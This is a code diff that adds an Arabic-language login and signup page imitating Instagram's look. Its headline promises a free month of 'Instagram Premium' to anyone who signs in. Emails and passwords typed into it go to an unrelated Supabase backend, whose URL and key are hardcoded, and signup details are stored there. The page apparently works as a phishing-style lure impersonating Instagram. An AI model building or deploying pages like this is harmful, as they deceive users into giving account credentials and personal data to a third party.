@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Tahoma, Arial, sans-serif;
+    background: #fafafa;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+  }
+  .wrap { width: 100%; max-width: 350px; }
+  .card {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 8px;
+    padding: 36px 32px 20px;
+    text-align: center;
+  }
+  .logo {
+    font-family: 'Brush Script MT', cursive, sans-serif;
+    font-size: 42px;
+    font-weight: 700;
+    background: linear-gradient(90deg,#f58529,#dd2a7b,#8134af,#515bd4);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 24px;
+    letter-spacing: -1px;
+  }
+  .field {
+    width: 100%;
+    padding: 10px 12px;
+    margin-bottom: 8px;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 4px;
+    font-size: 13px;
+    text-align: right;
+  }
+  .field:focus { outline: none; border-color: #a8a8a8; }
+  .btn-main {
+    width: 100%;
+    padding: 8px;
+    margin-top: 10px;
+    background: #0095f6;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+  }
+  .btn-main:disabled { opacity: .5; cursor: default; }
+  .divider {
+    display: flex;
+    align-items: center;
+    color: #8e8e8e;
+    font-size: 12px;
+    font-weight: 600;
+    margin: 18px 0;
+  }
+  .divider::before, .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #dbdbdb;
+  }
+  .divider::before { margin-left: 12px; }
+  .divider::after { margin-right: 12px; }
+  .msg {
+    font-size: 13px;
+    margin-top: 12px;
+    padding: 8px;
+    border-radius: 4px;
+  }
+  .msg.error { background: #fdecea; color: #d93025; }
+  .msg.success { background: #e6f4ea; color: #1e7e34; }
+  .switch-card {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 8px;
+    margin-top: 10px;
+    padding: 18px;
+    font-size: 14px;
+  }
+  .switch-card a { color: #0095f6; font-weight: 600; cursor: pointer; }
+  .hidden { display: none !important; }
+  .spinner {
+    width: 14px; height: 14px;
+    border: 2px solid rgba(255,255,255,.4);
+    border-top-color: #fff;
+    border-radius: 50%;
+    display: inline-block;
+    animation: spin .7s linear infinite;
+    vertical-align: middle;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+
+  <!-- كارت تسجيل الدخول -->
+  <div class="card" id="loginCard">
+    <div class="logo">سجل دخولك لتحصل على انستجرام بريميوم لمدة شهر</div>
+
+    <input type="text" id="loginEmail" class="field" placeholder="الإيميل">
+    <input type="password" id="loginPassword" class="field" placeholder="كلمة السر">
+
+    <button class="btn-main" id="loginBtn" onclick="handleLogin()">تسجيل الدخول</button>
+
+    <div id="loginMsg"></div>
+
+    <div class="divider">أو</div>
+    <div style="font-size:13px;color:#385185;font-weight:600;cursor:pointer" onclick="alert('لسه مش متاح')">نسيت كلمة السر؟</div>
+  </div>
+
+  <div class="switch-card">
+    معندكش حساب؟ <a onclick="showSignup()">اعمل حساب جديد</a>
+  </div>
+
+  <!-- كارت التسجيل -->
+  <div class="card hidden" id="signupCard">
+    <div class="logo">انستجران</div>
+    <div style="font-size:17px;font-weight:600;color:#8e8e8e;margin-bottom:20px">
+      سجّل عشان تتابع أصحابك
+    </div>
+
+    <input type="text" id="signupFullname" class="field" placeholder="الاسم بالكامل">
+    <input type="text" id="signupUsername" class="field" placeholder="اسم المستخدم (يوزر نيم)">
+    <input type="email" id="signupEmail" class="field" placeholder="الإيميل">
+    <input type="password" id="signupPassword" class="field" placeholder="كلمة السر">
+
+    <button class="btn-main" id="signupBtn" onclick="handleSignup()">تسجيل</button>
+
+    <div id="signupMsg"></div>
+  </div>
+
+  <div class="switch-card hidden" id="backToLogin">
+    عندك حساب؟ <a onclick="showLogin()">سجّل دخول</a>
+  </div>
+
+</div>
+
+<script>
+  // ================== إعدادات Supabase ==================
+  // حط بيانات مشروعك هنا (من Supabase Dashboard > Settings > API)
+  const SUPABASE_URL = "https://sqmhdpykntsxjlpdztms.supabase.co";
+  const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNxbWhkcHlrbnRzeGpscGR6dG1zIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODc1NjYxMzUsImV4cCI6MjEwMzE0MjEzNX0.g0tmEaV_vND1iY-OqmHGKsi2kJ4p8Au3XiUvAjeW9QM";
+
+  const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+  // ================== تبديل بين الكاردين ==================
+  function showSignup() {
+    document.getElementById('loginCard').classList.add('hidden');
+    document.querySelector('.switch-card:not(.hidden)').classList.add('hidden');
+    document.getElementById('signupCard').classList.remove('hidden');
+    document.getElementById('backToLogin').classList.remove('hidden');
+  }
+  function showLogin() {
+    document.getElementById('signupCard').classList.add('hidden');
+    document.getElementById('backToLogin').classList.add('hidden');
+    document.getElementById('loginCard').classList.remove('hidden');
+    document.querySelectorAll('.switch-card')[0].classList.remove('hidden');
+  }
+
+  function showMsg(elId, text, type) {
+    const el = document.getElementById(elId);
+    el.innerHTML = `<div class="msg ${type}">${text}</div>`;
+  }
+
+  // ================== تسجيل الدخول ==================
+  async function handleLogin() {
+    const email = document.getElementById('loginEmail').value.trim();
+    const password = document.getElementById('loginPassword').value;
+    const btn = document.getElementById('loginBtn');
+
+    if (!email || !password) {
+      showMsg('loginMsg', 'اكتب الإيميل وكلمة السر', 'error');
+      return;
+    }
+
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span>';
+
+    const { data, error } = await supabase.auth.signInWithPassword({ email, password });
+
+    btn.disabled = false;
+    btn.innerHTML = 'تسجيل الدخول';
+
+    if (error) {
+      showMsg('loginMsg', 'الإيميل أو كلمة السر غلط', 'error');
+      return;
+    }
+
+    showMsg('loginMsg', 'تم تسجيل الدخول، بتحول دلوقتي...', 'success');
+    // بعد الدخول، حوّل لصفحة الفيد (لما تتعمل)
+    // window.location.href = 'feed.html';
+  }
+
+  // ================== إنشاء حساب ==================
+  async function handleSignup() {
+    const fullname = document.getElementById('signupFullname').value.trim();
+    const username = document.getElementById('signupUsername').value.trim().toLowerCase();
+    const email = document.getElementById('signupEmail').value.trim();
+    const password = document.getElementById('signupPassword').value;
+    const btn = document.getElementById('signupBtn');
+
+    if (!fullname || !username || !email || !password) {
+      showMsg('signupMsg', 'لازم تملى كل الخانات', 'error');
+      return;
+    }
+    if (password.length < 6) {
+      showMsg('signupMsg', 'كلمة السر لازم تكون 6 حروف على الأقل', 'error');
+      return;
+    }
+    if (!/^[a-z0-9_.]+$/.test(username)) {
+      showMsg('signupMsg', 'اسم المستخدم يكون بالإنجليزي وأرقام وشرطة سفلية بس', 'error');
+      return;
+    }
+
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span>';
+
+    // تأكد إن اليوزرنيم مش مكرر
+    const { data: existing } = await supabase
+      .from('profiles')
+      .select('id')
+      .eq('username', username)
+      .maybeSingle();
+
+    if (existing) {
+      btn.disabled = false;
+      btn.innerHTML = 'تسجيل';
+      showMsg('signupMsg', 'اسم المستخدم ده متحجز، جرّب اسم تاني', 'error');
+      return;
+    }
+
+    // إنشاء الحساب في Supabase Auth
+    const { data, error } = await supabase.auth.signUp({
+      email,
+      password,
+      options: {
+        data: { full_name: fullname, username: username }
+      }
+    });
+
+    if (error) {
+      btn.disabled = false;
+      btn.innerHTML = 'تسجيل';
+      showMsg('signupMsg', 'حصل خطأ: ' + error.message, 'error');
+      return;
+    }
+
+    // إنشاء صف البروفايل المرتبط بالحساب
+    if (data.user) {
+      const { error: profileError } = await supabase.from('profiles').insert({
+        id: data.user.id,
+        username: username,
+        full_name: fullname
+      });
+
+      if (profileError) {
+        showMsg('signupMsg', 'اتعمل الحساب بس حصلت مشكلة في البروفايل: ' + profileError.message, 'error');
+        btn.disabled = false;
+        btn.innerHTML = 'تسجيل';
+        return;
+      }
+    }
+
+    btn.disabled = false;
+    btn.innerHTML = 'تسجيل';
+    showMsg('signupMsg', 'اتعمل الحساب بنجاح! ممكن دلوقتي تأكد الإيميل لو مطلوب وتسجل دخول.', 'success');
+  }
+
+  // ================== لو المستخدم داخل بالفعل ==================
+  (async () => {
+    const { data: { session } } = await supabase.auth.getSession();
+    if (session) {
+      showMsg('loginMsg', 'انت مسجل دخول بالفعل (' + session.user.email + ')', 'success');
+    }
+  })();
+</script>
+
+</body>
+</html>
